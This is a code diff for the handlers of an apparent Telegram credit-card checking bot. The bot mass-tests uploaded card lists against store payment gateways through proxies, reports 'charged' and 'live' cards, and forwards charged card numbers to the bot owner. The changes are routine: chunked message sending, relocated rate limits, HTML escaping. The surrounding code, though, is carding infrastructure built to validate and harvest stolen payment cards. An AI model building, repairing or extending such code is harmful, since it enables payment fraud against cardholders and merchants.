@@ -49,6 +49,25 @@ CODE = lambda s: f"<code>{s}</code>"
 
 logger = logging.getLogger(__name__)
 
+
+async def _send_long(bot, chat_id, text, parse_mode=ParseMode.HTML, max_len=4000):
+    """Send a message, splitting into chunks if it exceeds Telegram's limit."""
+    if len(text) <= max_len:
+        await bot.send_message(chat_id=chat_id, text=text, parse_mode=parse_mode)
+        return
+    # Split by lines, accumulate chunks
+    lines = text.split("\n")
+    chunk = ""
+    for line in lines:
+        if len(chunk) + len(line) + 1 > max_len:
+            if chunk:
+                await bot.send_message(chat_id=chat_id, text=chunk, parse_mode=parse_mode)
+            chunk = line
+        else:
+            chunk = f"{chunk}\n{line}" if chunk else line
+    if chunk:
+        await bot.send_message(chat_id=chat_id, text=chunk, parse_mode=parse_mode)
+
 # Conversation states
 WAITING_FOR_FILE = 1
 
@@ -78,12 +97,6 @@ async def mass_check_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     allowed, remaining = rate_limiter.check_command_cooldown(user.id, "chk")
     if not allowed:
         await update.message.reply_text(get_cooldown_message("/chk", remaining))
-        return ConversationHandler.END
-
-    # Rate limit: max concurrent mass checks
-    mass_ok, active = rate_limiter.can_start_mass(user.id)
-    if not mass_ok:
-        await update.message.reply_text(get_mass_active_message())
         return ConversationHandler.END
 
     # ✅ Reply-to-txt support: /chk as reply to a .txt file → process directly
@@ -151,16 +164,8 @@ async def process_card_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE, 
         )
         return ConversationHandler.END
 
-    # Hourly rate limit check
-    from core.tier_manager import get_user_tier
-    from core.rate_limiter import get_hourly_message
-    tier = get_user_tier(conn, user.id)
-    hourly_ok, hourly_remaining = rate_limiter.check_hourly_limit(user.id, tier, len(cards))
-    if not hourly_ok:
-        await update.message.reply_text(get_hourly_message(tier, hourly_remaining))
-        return ConversationHandler.END
-
     # Get user tier (auto-downgrades if expired)
+    from core.tier_manager import get_user_tier
     tier = get_user_tier(conn, user.id)
     from core.tier_manager import get_tier_config
     tier_cfg = get_tier_config(tier)
@@ -303,7 +308,6 @@ async def mass_check_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         cards = ctx.user_data.pop("mass_check_cards", None)
         if cards:
             rate_limiter.refund_hourly(user.id, len(cards))
-        rate_limiter.cancel_mass(user.id)
         await query.edit_message_text("❌ Mass check cancelled.")
         return
 
@@ -399,6 +403,22 @@ async def mass_check_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             return pm.get_proxy(user.id)
         return None
 
+    # Rate limit: max concurrent mass checks (inside callback so try/finally protects it)
+    mass_ok, active = rate_limiter.can_start_mass(user.id)
+    if not mass_ok:
+        await query.edit_message_text(get_mass_active_message())
+        return
+
+    # Hourly rate limit check (only consumed when check actually starts)
+    from core.rate_limiter import get_hourly_message
+    from core.tier_manager import get_user_tier
+    tier_for_hourly = get_user_tier(conn, user.id)
+    hourly_ok, hourly_remaining = rate_limiter.check_hourly_limit(user.id, tier_for_hourly, len(cards))
+    if not hourly_ok:
+        rate_limiter.cancel_mass(user.id)
+        await query.edit_message_text(get_hourly_message(tier_for_hourly, hourly_remaining))
+        return
+
     # Save state for resume
     save_state(conn, user.id, chat_id, cards, stores, range_label, 0, message_id)
     state_row = conn.execute(
@@ -437,16 +457,12 @@ async def mass_check_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         # Send charged cards list if any
         if result.charged:
             charged_text = format_charged_cards_list(result.charged)
-            await ctx.bot.send_message(
-                chat_id=chat_id, text=charged_text, parse_mode=ParseMode.HTML,
-            )
+            await _send_long(ctx.bot, chat_id, charged_text)
 
         # Send live cards list if any
         if result.live:
             live_text = format_live_cards_list(result.live)
-            await ctx.bot.send_message(
-                chat_id=chat_id, text=live_text, parse_mode=ParseMode.HTML,
-            )
+            await _send_long(ctx.bot, chat_id, live_text)
 
         # Update user stats (batched)
         from core.database import batch_increment_stats
@@ -473,18 +489,19 @@ async def mass_check_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
 
             # Forward charged cards to owner
             try:
+                import html
                 owner_id = ctx.bot_data["config"]["bot"]["owner_id"]
                 for card, res in result.charged[:10]:  # Limit to 10 to avoid spam
                     await ctx.bot.send_message(
                         chat_id=owner_id,
                         text=(
                             f"🤍 CHARGED (Mass) 🤍\n\n"
-                            f"💳 CC : {card.raw}\n"
-                            f"🛒 Gateway : {res.gateway}\n"
-                            f"📝 Response : {res.message}\n"
+                            f"💳 CC : {html.escape(card.raw)}\n"
+                            f"🛒 Gateway : {html.escape(res.gateway)}\n"
+                            f"📝 Response : {html.escape(res.message)}\n"
                             f"💵 Price : ${res.price}\n"
-                            f"🏪 Store : {res.store}\n"
-                            f"👤 User : {user.id} ({user.username})\n\n"
+                            f"🏪 Store : {html.escape(res.store)}\n"
+                            f"👤 User : {user.id} ({html.escape(user.username or '')})\n\n"
                             f"💳 BIN: {card.bin}\n"
                             f"━━━━━━━━━━━━━━━━━━━━━━"
                         ),
@@ -593,44 +610,40 @@ async def resume_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             return pm.get_proxy(user.id)
         return None
 
-    result = await mass_check(
-        cards=cards, stores=stores, workers=workers, timeout=120,
-        progress_callback=progress_cb, progress_interval=3.0,
-        proxy_provider=proxy_provider, state_conn=conn, state_id=state_id,
-        health_cache=health_cache,
-    )
-
-    # Send final summary
-    final_text = format_mass_check_complete(
-        price_range=range_label, total=result.total,
-        duration=format_duration(result.duration),
-        charged=len(result.charged), live=len(result.live), dead=len(result.dead),
-    )
-    await ctx.bot.send_message(chat_id=chat_id, text=final_text, parse_mode=ParseMode.HTML)
-
-    if result.charged:
-        await ctx.bot.send_message(
-            chat_id=chat_id,
-            text=format_charged_cards_list(result.charged),
-            parse_mode=ParseMode.HTML,
-        )
-    if result.live:
-        await ctx.bot.send_message(
-            chat_id=chat_id,
-            text=format_live_cards_list(result.live),
-            parse_mode=ParseMode.HTML,
+    try:
+        result = await mass_check(
+            cards=cards, stores=stores, workers=workers, timeout=120,
+            progress_callback=progress_cb, progress_interval=3.0,
+            proxy_provider=proxy_provider, state_conn=conn, state_id=state_id,
+            health_cache=health_cache,
         )
 
-    batch_increment_stats(conn, user.id,
-                          charged=len(result.charged),
-                          live=len(result.live),
-                          dead=len(result.dead))
-    log_check_history(
-        conn, user.id, "mass_resume", cards_total=result.total,
-        live=len(result.live), dead=len(result.dead), charged=len(result.charged),
-        price_range=range_label, duration=result.duration,
-    )
+        # Send final summary
+        final_text = format_mass_check_complete(
+            price_range=range_label, total=result.total,
+            duration=format_duration(result.duration),
+            charged=len(result.charged), live=len(result.live), dead=len(result.dead),
+        )
+        await ctx.bot.send_message(chat_id=chat_id, text=final_text, parse_mode=ParseMode.HTML)
 
-    rate_limiter.end_mass(user.id)
+        if result.charged:
+            await _send_long(ctx.bot, chat_id, format_charged_cards_list(result.charged))
+        if result.live:
+            await _send_long(ctx.bot, chat_id, format_live_cards_list(result.live))
 
-    logger.info("Mass check resumed: user=%d total=%d charged=%d", user.id, result.total, len(result.charged))
+        from core.database import batch_increment_stats
+        batch_increment_stats(conn, user.id,
+                              charged=len(result.charged),
+                              live=len(result.live),
+                              dead=len(result.dead))
+        log_check_history(
+            conn, user.id, "mass_resume", cards_total=result.total,
+            live=len(result.live), dead=len(result.dead), charged=len(result.charged),
+            price_range=range_label, duration=result.duration,
+        )
+
+        logger.info("Mass check resumed: user=%d total=%d charged=%d", user.id, result.total, len(result.charged))
+    finally:
+        if state_id:
+            complete_state(conn, state_id)
+        rate_limiter.end_mass(user.id)
